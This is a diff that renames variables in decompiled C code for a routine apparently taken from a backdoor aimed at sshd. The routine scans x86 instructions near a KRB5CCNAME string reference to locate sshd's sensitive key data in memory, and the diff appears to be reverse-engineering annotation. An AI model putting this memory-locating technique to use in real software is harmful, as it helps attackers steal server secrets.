@@ -18,150 +18,145 @@ BOOL sshd_get_sensitive_data_address_via_krb5ccname
                elf_info_t *elf)
 
 {
-  undefined1 uVar1;
+  u8 dest_reg;
   BOOL BVar2;
-  u8 *code_start_00;
-  u8 *puVar3;
-  uint uVar4;
+  u8 *krb5_string_ref;
+  u8 *candidate_store;
+  uint probe_depth;
   long lVar5;
-  byte bVar6;
-  u8 *puVar7;
-  u8 *puVar8;
+  u8 rex_extension;
+  u8 *data_cursor;
+  u8 *store_scan_cursor;
   dasm_ctx_t *pdVar9;
-  undefined1 uVar10;
+  u8 tracked_reg;
   byte bVar11;
   dasm_ctx_t string_scan_ctx;
   dasm_ctx_t store_scan_ctx;
-  u8 *krb5_string_ref;
-  u8 *candidate_store;
-  u8 *data_cursor;
-  dasm_ctx_t local_d8;
-  dasm_ctx_t local_80;
   
   bVar11 = 0;
-  pdVar9 = &local_d8;
+  pdVar9 = &string_scan_ctx;
   for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
     *(undefined4 *)&pdVar9->instruction = 0;
     pdVar9 = (dasm_ctx_t *)((long)&pdVar9->instruction + 4);
   }
   *sensitive_data_out = (void *)0x0;
-  code_start_00 = elf_find_string_reference(elf,STR_KRB5CCNAME,code_start,code_end);
-  if (code_start_00 != (u8 *)0x0) {
-    while (code_start_00 < code_end) {
-      BVar2 = x86_dasm(&local_d8,code_start_00,code_end);
+  krb5_string_ref = elf_find_string_reference(elf,STR_KRB5CCNAME,code_start,code_end);
+  if (krb5_string_ref != (u8 *)0x0) {
+    while (krb5_string_ref < code_end) {
+      BVar2 = x86_dasm(&string_scan_ctx,krb5_string_ref,code_end);
       if (BVar2 == FALSE) {
-        code_start_00 = code_start_00 + 1;
+        krb5_string_ref = krb5_string_ref + 1;
       }
       else {
-        if ((*(u32 *)&local_d8.opcode_window[3] & 0xfffffffd) == 0xb1) {
-          if (local_d8.prefix.decoded.modrm.breakdown.modrm_mod == '\x03') {
-            if (((local_d8.prefix.flags_u16 & 0x20) == 0) ||
-               (((byte)local_d8.prefix.decoded.rex & 8) == 0)) {
-              uVar1 = local_d8.prefix.decoded.flags & 0x40;
-              if ((local_d8.prefix.flags_u16 & 0x1040) == 0) {
-                if ((local_d8.prefix.flags_u16 & 0x40) != 0) {
-                  uVar10 = 0;
-                  uVar1 = local_d8.prefix.decoded.modrm.breakdown.modrm_rm;
-                  if ((local_d8.prefix.flags_u16 & 0x20) != 0) {
+        if ((*(u32 *)&string_scan_ctx.opcode_window[3] & 0xfffffffd) == 0xb1) {
+          if (string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_mod == '\x03') {
+            if (((string_scan_ctx.prefix.flags_u16 & 0x20) == 0) ||
+               (((byte)string_scan_ctx.prefix.decoded.rex & 8) == 0)) {
+              dest_reg = string_scan_ctx.prefix.decoded.flags & 0x40;
+              if ((string_scan_ctx.prefix.flags_u16 & 0x1040) == 0) {
+                if ((string_scan_ctx.prefix.flags_u16 & 0x40) != 0) {
+                  tracked_reg = 0;
+                  dest_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_rm;
+                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
 LAB_00103450:
-                    uVar1 = local_d8.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)local_d8.prefix.decoded.rex & 1) << 3;
+                    dest_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)string_scan_ctx.prefix.decoded.rex & 1) << 3;
                   }
                   goto LAB_0010345d;
                 }
-                uVar10 = 0;
+                tracked_reg = 0;
               }
               else {
-                if ((local_d8.prefix.flags_u16 & 0x40) == 0) {
-                  uVar10 = local_d8.prefix.decoded.flags2 & 0x10;
-                  if ((local_d8.prefix.flags_u16 & 0x1000) == 0) goto LAB_0010346b;
-                  uVar10 = local_d8.imm64_reg;
-                  if ((local_d8.prefix.flags_u16 & 0x20) != 0) {
-                    uVar10 = local_d8.imm64_reg | ((byte)local_d8.prefix.decoded.rex & 1) << 3;
+                if ((string_scan_ctx.prefix.flags_u16 & 0x40) == 0) {
+                  tracked_reg = string_scan_ctx.prefix.decoded.flags2 & 0x10;
+                  if ((string_scan_ctx.prefix.flags_u16 & 0x1000) == 0) goto LAB_0010346b;
+                  tracked_reg = string_scan_ctx.imm64_reg;
+                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
+                    tracked_reg = string_scan_ctx.imm64_reg | ((byte)string_scan_ctx.prefix.decoded.rex & 1) << 3;
                   }
                 }
                 else {
-                  uVar10 = local_d8.prefix.decoded.modrm.breakdown.modrm_reg;
-                  uVar1 = local_d8.prefix.decoded.modrm.breakdown.modrm_rm;
-                  if ((local_d8.prefix.flags_u16 & 0x20) != 0) {
-                    uVar10 = local_d8.prefix.decoded.modrm.breakdown.modrm_reg |
-                             (char)local_d8.prefix.decoded.rex * '\x02' & 8U;
+                  tracked_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_reg;
+                  dest_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_rm;
+                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
+                    tracked_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_reg |
+                             (char)string_scan_ctx.prefix.decoded.rex * '\x02' & 8U;
                     goto LAB_00103450;
                   }
                 }
 LAB_0010345d:
-                if (uVar1 != uVar10) goto LAB_001033d1;
+                if (dest_reg != tracked_reg) goto LAB_001033d1;
               }
 LAB_0010346b:
-              pdVar9 = &local_80;
+              pdVar9 = &store_scan_ctx;
               for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
                 *(undefined4 *)&pdVar9->instruction = 0;
                 pdVar9 = (dasm_ctx_t *)((long)pdVar9 + (ulong)bVar11 * -8 + 4);
               }
-              puVar8 = local_d8.instruction + local_d8.instruction_size;
-              uVar4 = 0;
-              while (((puVar8 < code_end && (uVar4 < 6)) &&
-                     (BVar2 = x86_dasm(&local_80,puVar8,code_end), BVar2 != FALSE))) {
-                if (*(u32 *)&local_80.opcode_window[3] == 0x109) {
-                  if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
-                    uVar1 = 0;
-                    if ((local_80.prefix.flags_u16 & 0x1040) != 0) {
-                      if ((local_80.prefix.flags_u16 & 0x40) == 0) {
-                        uVar1 = local_80.prefix.decoded.flags2 & 0x10;
-                        if (((local_80.prefix.flags_u16 & 0x1000) != 0) &&
-                           (uVar1 = local_80.imm64_reg, (local_80.prefix.flags_u16 & 0x20) != 0)) {
-                          bVar6 = (char)local_80.prefix.decoded.rex << 3;
+              store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size;
+              probe_depth = 0;
+              while (((store_scan_cursor < code_end && (probe_depth < 6)) &&
+                     (BVar2 = x86_dasm(&store_scan_ctx,store_scan_cursor,code_end), BVar2 != FALSE))) {
+                if (*(u32 *)&store_scan_ctx.opcode_window[3] == 0x109) {
+                  if (((uint)store_scan_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
+                    dest_reg = 0;
+                    if ((store_scan_ctx.prefix.flags_u16 & 0x1040) != 0) {
+                      if ((store_scan_ctx.prefix.flags_u16 & 0x40) == 0) {
+                        dest_reg = store_scan_ctx.prefix.decoded.flags2 & 0x10;
+                        if (((store_scan_ctx.prefix.flags_u16 & 0x1000) != 0) &&
+                           (dest_reg = store_scan_ctx.imm64_reg, (store_scan_ctx.prefix.flags_u16 & 0x20) != 0)) {
+                          rex_extension = (char)store_scan_ctx.prefix.decoded.rex << 3;
                           goto LAB_00103553;
                         }
                       }
                       else {
-                        uVar1 = local_80.prefix.decoded.modrm.breakdown.modrm_reg;
-                        if ((local_80.prefix.flags_u16 & 0x20) != 0) {
-                          bVar6 = (char)local_80.prefix.decoded.rex * '\x02';
+                        dest_reg = store_scan_ctx.prefix.decoded.modrm.breakdown.modrm_reg;
+                        if ((store_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
+                          rex_extension = (char)store_scan_ctx.prefix.decoded.rex * '\x02';
 LAB_00103553:
-                          uVar1 = uVar1 | bVar6 & 8;
+                          dest_reg = dest_reg | rex_extension & 8;
                         }
                       }
                     }
-                    if (uVar1 == uVar10) {
-                      puVar3 = (u8 *)0x0;
-                      if ((local_80.prefix.flags_u16 & 0x100) != 0) {
-                        puVar3 = local_80.instruction +
-                                 local_80.instruction_size + local_80.mem_disp;
+                    if (dest_reg == tracked_reg) {
+                      candidate_store = (u8 *)0x0;
+                      if ((store_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
+                        candidate_store = store_scan_ctx.instruction +
+                                 store_scan_ctx.instruction_size + store_scan_ctx.mem_disp;
                       }
-                      puVar7 = puVar3 + -0x18;
-                      if ((data_start <= puVar7 && puVar3 != (u8 *)0x18) && (puVar3 + 4 <= data_end)
+                      data_cursor = candidate_store + -0x18;
+                      if ((data_start <= data_cursor && candidate_store != (u8 *)0x18) && (candidate_store + 4 <= data_end)
                          ) goto LAB_0010365f;
                     }
                   }
                 }
-                else if (*(u32 *)&local_80.opcode_window[3] == 0xa5fe) break;
-                puVar8 = puVar8 + local_80.instruction_size;
-                uVar4 = uVar4 + 1;
+                else if (*(u32 *)&store_scan_ctx.opcode_window[3] == 0xa5fe) break;
+                store_scan_cursor = store_scan_cursor + store_scan_ctx.instruction_size;
+                probe_depth = probe_depth + 1;
               }
             }
           }
         }
-        else if (*(u32 *)&local_d8.opcode_window[3] == 0x147) {
-          if ((((((byte)local_d8.prefix.decoded.rex & 8) == 0) &&
-               ((uint)local_d8.prefix.decoded.modrm >> 8 == 0x50000)) &&
-              ((local_d8.prefix.flags_u16 & 0x800) != 0)) && (local_d8.operand_zeroextended == 0)) {
-            puVar8 = (u8 *)0x0;
-            if ((local_d8.prefix.flags_u16 & 0x100) != 0) {
-              puVar8 = local_d8.instruction + local_d8.instruction_size + local_d8.mem_disp;
+        else if (*(u32 *)&string_scan_ctx.opcode_window[3] == 0x147) {
+          if ((((((byte)string_scan_ctx.prefix.decoded.rex & 8) == 0) &&
+               ((uint)string_scan_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
+              ((string_scan_ctx.prefix.flags_u16 & 0x800) != 0)) && (string_scan_ctx.operand_zeroextended == 0)) {
+            store_scan_cursor = (u8 *)0x0;
+            if ((string_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
+              store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size + string_scan_ctx.mem_disp;
             }
-            puVar7 = puVar8 + -0x18;
-            if (((puVar8 + 4 <= data_end) && (data_start <= puVar7)) && (puVar7 != (u8 *)0x0)) {
+            data_cursor = store_scan_cursor + -0x18;
+            if (((store_scan_cursor + 4 <= data_end) && (data_start <= data_cursor)) && (data_cursor != (u8 *)0x0)) {
 LAB_0010365f:
-              *sensitive_data_out = puVar7;
+              *sensitive_data_out = data_cursor;
               return TRUE;
             }
           }
         }
-        else if ((*(u32 *)&local_d8.opcode_window[3] == 0xa5fe) && (code_start != local_d8.instruction)) {
+        else if ((*(u32 *)&string_scan_ctx.opcode_window[3] == 0xa5fe) && (code_start != string_scan_ctx.instruction)) {
           return FALSE;
         }
 LAB_001033d1:
-        code_start_00 = code_start_00 + local_d8.instruction_size;
+        krb5_string_ref = krb5_string_ref + string_scan_ctx.instruction_size;
       }
     }
   }
